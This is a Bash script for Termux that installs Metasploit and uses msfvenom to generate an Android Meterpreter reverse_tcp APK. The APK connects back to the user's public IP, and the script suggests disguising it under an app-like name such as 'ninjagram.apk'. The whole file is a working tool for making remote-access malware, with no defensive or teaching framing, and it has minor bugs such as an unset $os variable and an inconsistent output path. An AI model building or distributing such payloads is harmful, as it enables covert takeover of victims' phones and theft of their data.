#!/bin/bash

# simple script for a user from themasterch

# colors

# Reset
rs='\033[m'

# Regular Colors
r='\033[0;31m'
g='\033[0;32m'
y='\033[0;33m'
b='\033[0;34m' 
p='\033[0;35m'
c='\033[0;36m'
w='\033[0;37m'

# Background
or='\033[41m'
og='\033[42m'
oy='\033[43m'
ob='\033[44m'
op='\033[45m'
oc='\033[46m'
ow='\033[47m'

# Bold
bd='\033[1m'

# Vars

ip=$(curl -s ipinfo.io/ip)
ps=$(uname -s)

if [ -f $PWD/error.log ]
then
	rm error.log
fi

echo -e "${bd}"
clear
if ! hash figlet 2>error.log
then
	clear
	echo -e "${r}[!] Installing figlet.."
	sleep 0.5
	pkg install figlet 2>error.log
else
	clear
	echo -e "${g}[i] ${b}Successfully loaded script."
fi

echo -e "${y}Your IP: ${p}$ip"
echo -e "${y}Your OS: ${p}$os"
echo -ne "${g}[i] ${b}Do you want install packages to begin?[Y/N]:${p} "
read pck
if [[ "$pck" == "Y" || "$pck" == "y" ]]
then
	echo -ne "${g}[i] ${r}Press enter to begin process> "
	read enter
	sleep 1
	pkg install python python2 vim figlet curl php lolcat nano unstable-repo -y 2>error.log 
	pkg upgrade -y 2>error.log
else
	echo -e "${g}[i] ${b}Skipping packages section, hope you installed all packages manually..."
	sleep 1
fi

if ! hash msfvenom 2>error.log
then
	echo -e "${r}[!] Could not find msfvenom command !"
	sleep 0.5
	echo -e "${g}[i] ${b}Fixing it..."
	sleep 0.5
	echo -ne "${g}[i] ${b}Press enter to begin process, this could take some time> "
	read enter
	apt install metasploit -y 2>error.log
else
	echo -e "${g}[i] ${b}Metasploit installed, let's begin!"
	sleep 0.5
fi

echo -e "${g}[i] ${b}Setting up storage, please confirm it."
sleep 0.5
termux-setup-storage
echo -ne "${g}[i] ${b}Press enter to start creating payload> "
read enter
clear
sleep 0.5
figlet "PayL0aD Cre4tion"
echo ""
echo -ne "${g}[i] ${b}Select Port(ex: 8888): "
read port
echo -ne "${g}[i] ${b}Select APK Output name(ex: ninjagram.apk): "
read name

msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> sdcard/$name || echo -e "${r}[!] Failed to create APK, errors fetched in : ${p}error.log"

if [ -f /sdcard/$name ]
then
	echo "${g}[*] ${b}APK Successfully created : ${p}/sdcard$name"
else
	echo "${r}[!] ${b}Was not able to create apk, check log: ${p}error.log"
fi
exit
